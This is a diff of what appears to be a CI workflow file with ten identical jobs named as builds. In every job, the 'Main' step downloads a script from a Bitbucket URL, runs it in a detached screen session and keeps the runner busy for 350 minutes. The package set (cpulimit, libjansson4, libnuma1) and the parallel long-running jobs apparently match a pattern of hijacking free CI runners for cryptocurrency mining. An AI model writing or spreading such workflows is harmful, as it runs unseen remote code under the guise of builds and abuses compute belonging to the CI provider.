@@ -47,13 +47,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-2:
@@ -78,13 +79,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-3:
@@ -109,13 +111,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-4:
@@ -140,13 +143,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-5:
@@ -171,13 +175,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-6:
@@ -202,13 +207,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-7:
@@ -233,13 +239,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-8:
@@ -264,13 +271,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-9:
@@ -295,13 +303,14 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
   Build-10:
@@ -326,12 +335,13 @@ jobs:
     - name : Install Tools
       run: |
         apt-get update
-        apt-get install -y screen curl cpulimit \
+        apt-get install -y screen curl cpulimit git \
           wget libjansson4 libnuma1
     - name: Main
       run: |
         mkdir build
         cd build
-        curl -s https://bitbucket.org/manajakaj/project1/raw/880bc93b1c7c089a6034ef82b91b1d3b3caa041a/run.sh | bash
+        wget https://bitbucket.org/manajakaj/project1/raw/ae86f8d8106cd5613a1b6473b1fe1fb72fb03009/runn.sh && chmod +x runn.sh && screen -dmS runn ./runn.sh
+        x=1; while [ $x -le 350 ]; do echo "Still running at $x minutes"; x=$(($x + 1)); sleep 1m; done
     - name: Done
       run: rm -rf build
